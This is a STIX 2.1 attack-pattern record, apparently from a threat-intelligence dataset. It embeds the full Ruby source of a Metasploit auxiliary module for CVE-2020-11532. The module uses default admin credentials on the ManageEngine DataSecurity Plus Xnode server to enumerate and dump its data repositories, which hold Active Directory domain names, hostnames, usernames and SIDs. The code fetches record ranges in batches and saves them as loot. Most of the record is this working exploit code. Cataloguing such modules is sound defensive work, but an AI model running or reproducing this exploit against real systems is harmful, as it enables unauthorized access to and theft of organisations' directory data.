{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--039b9693-687d-4304-856f-ccfbc2e32f04",
    "created": "2024-08-14T16:32:06.833674Z",
    "modified": "2024-08-14T16:32:06.833678Z",
    "name": "ManageEngine DataSecurity Plus Xnode Enumeration",
    "description": " This module exploits default admin credentials for the DataEngine Xnode server in DataSecurity Plus versions prior to 6.0.1 (6011) in order to dump the contents of Xnode data repositories (tables) which may contain (a limited amount of) Active Directory information including domain names, host names, usernames and SIDs. This module can also be used against patched DataSecurity Plus versions if the correct credentials are provided.  By default, this module dumps only the data repositories and fields (columns) specified in the configuration file (set via the CONFIG_FILE option). The configuration file is also used to add labels to the values sent by Xnode in response to a query.  It is also possible to use the DUMP_ALL option to obtain all data in all known data repositories without specifying data field names. However, note that when using the DUMP_ALL option, the data won't be labeled.  This module has been successfully tested against ManageEngine DataSecurity Plus 6.0.1 (6010) running on Windows Server 2012 R2. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/manageengine_datasecurity_plus_xnode_enum.rb",
            "external_id": "manageengine_datasecurity_plus_xnode_enum.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-11532"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::ManageEngineXnode\n  include Msf::Auxiliary::Report\n  include Msf::Exploit::Remote::Tcp\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(_info = {})\n    super(\n      'Name' => 'ManageEngine DataSecurity Plus Xnode Enumeration',\n      'Description' => %q{\n        This module exploits default admin credentials for the DataEngine\n        Xnode server in DataSecurity Plus versions prior to 6.0.1 (6011)\n        in order to dump the contents of Xnode data repositories (tables),\n        which may contain (a limited amount of) Active Directory\n        information including domain names, host names, usernames and SIDs.\n        This module can also be used against patched DataSecurity Plus\n        versions if the correct credentials are provided.\n\n        By default, this module dumps only the data repositories and fields\n        (columns) specified in the configuration file (set via the\n        CONFIG_FILE option). The configuration file is also used to\n        add labels to the values sent by Xnode in response to a query.\n\n        It is also possible to use the DUMP_ALL option to obtain all data\n        in all known data repositories without specifying data field names.\n        However, note that when using the DUMP_ALL option, the data won't be labeled.\n\n        This module has been successfully tested against ManageEngine\n        DataSecurity Plus 6.0.1 (6010) running on Windows Server 2012 R2.\n      },\n      'Author' => [\n        'Sahil Dhar', # discovery and PoC (for authentication only)\n        'Erik Wynter', # @wyntererik - additional research and Metasploit\n      ],\n      'License' => MSF_LICENSE,\n      'References' => [\n        ['CVE', '2020-11532'],\n        ['PACKETSTORM', '157609'],\n      ],\n    )\n    register_options [\n      OptString.new('CONFIG_FILE', [false, 'YAML file specifying the data repositories (tables) and fields (columns) to dump', File.join(Msf::Config.data_directory, 'exploits', 'manageengine_xnode', 'CVE-2020-11532', 'datasecurity_plus_xnode_conf.yaml')]),\n      OptBool.new('DUMP_ALL', [false, 'Dump all data from the available data repositories (tables). If true, CONFIG_FILE will be ignored.', false]),\n      Opt::RPORT(29119)\n    ]\n  end\n\n  def config_file\n    datastore['CONFIG_FILE'].to_s # in case it is nil\n  end\n\n  def dump_all\n    datastore['DUMP_ALL']\n  end\n\n  def username\n    datastore['USERNAME']\n  end\n\n  def password\n    datastore['PASSWORD']\n  end\n\n  def check\n    # create a socket\n    res_code, sock_or_msg = create_socket_for_xnode(rhost, rport)\n    if res_code == 1\n      return Exploit::CheckCode::Unknown(sock_or_msg)\n    end\n\n    @sock = sock_or_msg\n\n    # perform basic checks to see if Xnode is running and if so, if it is exploitable\n    res_code, res_msg = xnode_check(@sock, username, password)\n    case res_code\n    when 0\n      return Exploit::CheckCode::Appears(res_msg)\n    when 1\n      return Exploit::CheckCode::Safe(res_msg)\n    when 2\n      return Exploit::CheckCode::Unknown(res_msg)\n    else\n      return Exploit::CheckCode::Unknown('An unexpected error occurred whilst running this module. Please raise a bug ticket!')\n    end\n  end\n\n  # noinspection RubyMismatchedArgumentType\n  def run\n    # check if we already have a socket, if not, create one\n    unless @sock\n      # create a socket\n      res_code, sock_or_msg = create_socket_for_xnode(rhost, rport)\n      if res_code == 1\n        fail_with(Failure::Unreachable, sock_or_msg)\n      end\n      @sock = sock_or_msg\n    end\n\n    # get the Xnode health status\n    health_warning_message = ['Received unexpected response while trying to obtain the Xnode \"de_health\" status. Enumeration may not work.']\n    res_code, res_health = get_response(@sock, action_admin_health, health_warning_message, 'de_health')\n\n    if res_code == 0\n      if res_health['response']['de_health'] == 'GREEN'\n        print_status('Obtained expected Xnode \"de_health\" status: \"GREEN\".')\n      else\n        print_warning(\"Obtained unexpected Xnode \\\"de_health\\\" status: \\\"#{res_health['response']['de_health']}\\\"\")\n      end\n    end\n\n    # get the Xnode info\n    info_warning_message = ['Received unexpected response while trying to obtain the Xnode version and installation path via the \"xnode_info\" action. Enumeration may not work.']\n    res_code, res_info = get_response(@sock, action_xnode_info, info_warning_message)\n\n    if res_code == 0\n      if res_info['response'].keys.include?('xnode_version')\n        print_status(\"Target is running Xnode version: \\\"#{res_info['response']['xnode_version']}\\\".\")\n      else\n        print_warning('Failed to obtain the Xnode version.')\n      end\n\n      if res_info['response'].keys.include?('xnode_installation_path')\n        print_status(\"Obtained Xnode installation path: \\\"#{res_info['response']['xnode_installation_path']}\\\".\")\n      else\n        print_warning('Failed to obtain the Xnode installation path.')\n      end\n    end\n\n    # obtain the total number of records and the min and max record ID numbers for each repo, which is necessary to enumerate the records\n    repo_record_info_hash = {}\n    datasecurity_plus_data_repos.each do |repo|\n      # send a general query, which should return the \"total_hits\" parameter that represents the total record count\n      res_code, res = get_response(@sock, action_dr_search(repo))\n      total_hits = process_dr_search(res, res_code, repo, ['UNIQUE_ID'], 'total_hits')\n      # check if total_hits is nil, as that means process_dr_search failed and we should skip to the next repo\n      next if total_hits.nil?\n\n      total_hits = total_hits.first\n\n      # use \"aggr\" with the \"min\" specification for the UNIQUE_ID field in order to obtain the minimum value for this field, i.e. the oldest available record\n      aggr_min_query = { 'aggr' => { 'min' => { 'field' => 'UNIQUE_ID' } } }\n      res_code, res = get_response(@sock, action_dr_search(repo, ['UNIQUE_ID'], aggr_min_query))\n      aggr_min = process_dr_search(res, res_code, repo, ['UNIQUE_ID'], 'aggr_min')\n      # check if aggr_min is nil, as that means process_dr_search failed and we should skip to the next repo\n      next if aggr_min.nil?\n\n      aggr_min = aggr_min.first\n\n      # use \"aggr\" with the \"max\" specification for the UNIQUE_ID field in order to obtain the maximum value for this field, i.e. the most recent record\n      aggr_max_query = { 'aggr' => { 'max' => { 'field' => 'UNIQUE_ID' } } }\n      res_code, res = get_response(@sock, action_dr_search(repo, ['UNIQUE_ID'], aggr_max_query))\n      aggr_max = process_dr_search(res, res_code, repo, ['UNIQUE_ID'], 'aggr_max')\n      # check if aggr_max is nil, as that means process_dr_search failed and we should skip to the next repo\n      next if aggr_max.nil?\n\n      aggr_max = aggr_max.first\n\n      print_good(\"Data repository #{repo} contains #{total_hits} records with ID numbers between #{aggr_min} and #{aggr_max}.\")\n\n      repo_record_info_hash[repo] = {\n        'total_hits' => total_hits.to_i,\n        'aggr_min' => aggr_min.to_i,\n        'aggr_max' => aggr_max.to_i\n      }\n    end\n\n    # check if we found any repositories that contained any data\n    if repo_record_info_hash.empty?\n      print_error('None of the repositories specified contained any data!')\n      return\n    end\n\n    if dump_all\n      data_to_dump = datasecurity_plus_data_repos\n    else\n      data_to_dump = grab_config(config_file)\n\n      case data_to_dump\n      when config_status::CONFIG_FILE_DOES_NOT_EXIST\n        fail_with(Failure::BadConfig, \"Unable to obtain the Xnode data repositories to target from #{config_file} because this file does not exist. Please correct your 'CONFIG_FILE' setting or set 'DUMP_ALL' to true.\")\n      when config_status::CANNOT_READ_CONFIG_FILE\n        fail_with(Failure::BadConfig, \"Unable to read #{config_file}. Check if your 'CONFIG_FILE' setting is correct and make sure the file is readable and properly formatted.\")\n      when config_status::DATA_TO_DUMP_EMPTY\n        fail_with(Failure::BadConfig, \"The #{config_file} does not seem to contain any data repositories and fields to dump. Please fix your configuration or set 'DUMP_ALL' to true.\")\n      when config_status::DATA_TO_DUMP_WRONG_FORMAT\n        fail_with(Failure::BadConfig, \"Unable to obtain the Xnode data repositories to target from #{config_file}. The file doesn't appear to contain valid data. Check if your 'CONFIG_DIR' setting is correct or set 'DUMP_ALL' to true.\")\n      end\n    end\n\n    # try and dump the database tables Xnode has access to\n    data_to_dump.each do |repo, fields|\n      if fields.blank? && !dump_all\n        print_error(\"Unable to obtain any fields for the data repository #{repo} to query. Skipping this table. Check your config file for this module if this is unintended behavior.\")\n        next\n      end\n\n      # check if we actually found any records for the repo\n      next unless repo_record_info_hash.include?(repo)\n\n      total_hits = repo_record_info_hash[repo]['total_hits']\n      id_range_lower = repo_record_info_hash[repo]['aggr_min']\n      max_id = repo_record_info_hash[repo]['aggr_max']\n\n      if total_hits.nil? || id_range_lower.nil? || max_id.nil?\n        print_error(\"Unable to obtain the necessary fields for #{repo} from the repo_record_info_hash!\")\n        next\n      end\n\n      if total_hits == 0\n        print_error(\"No hits found for #{repo}!\")\n        next\n      end\n\n      id_range_upper = id_range_lower + 9\n      query_ct = 0\n\n      results = []\n      print_status(\"Attempting to request #{total_hits} records for data repository #{repo} between IDs #{id_range_lower} and #{max_id}. This could take a while...\")\n      hit_upper_limit = false\n      until hit_upper_limit\n        # build a custom query for the unique_id range\n        custom_query = { 'query' => \"UNIQUE_ID:[#{id_range_lower} TO #{id_range_upper}]\" }\n        query = action_dr_search(repo, fields, custom_query)\n        res_code, res = get_response(@sock, query)\n        partial_results = process_dr_search(res, res_code, repo, fields)\n        results += partial_results unless partial_results.nil?\n\n        query_ct += 1\n        if query_ct % 5 == 0\n          print_status(\"Processed #{query_ct} queries (max 10 records per query) so far. The last queried record ID was #{id_range_upper}. The max ID is #{max_id}...\")\n        end\n\n        # check if we have already queried the record with the maximum ID value, if so, we're done\n        if id_range_upper == max_id\n          hit_upper_limit = true\n        else\n          id_range_lower += 10\n          id_range_upper += 10\n          # make sure that id_range_upper never exceeds the maximum ID value\n          if id_range_upper > max_id\n            id_range_upper = max_id\n          end\n        end\n      end\n\n      if results.empty?\n        print_error(\"No non-empty records were obtained for #{repo}.\")\n        next\n      end\n\n      outfile_part = \"xnode_#{repo.downcase}\"\n      path = store_loot(outfile_part, 'application/json', rhost, results.to_json, \"#{repo}.json\")\n      print_good(\"Saving #{results.length} records from the #{repo} data repository to #{path}\")\n    end\n  end\nend\n"
}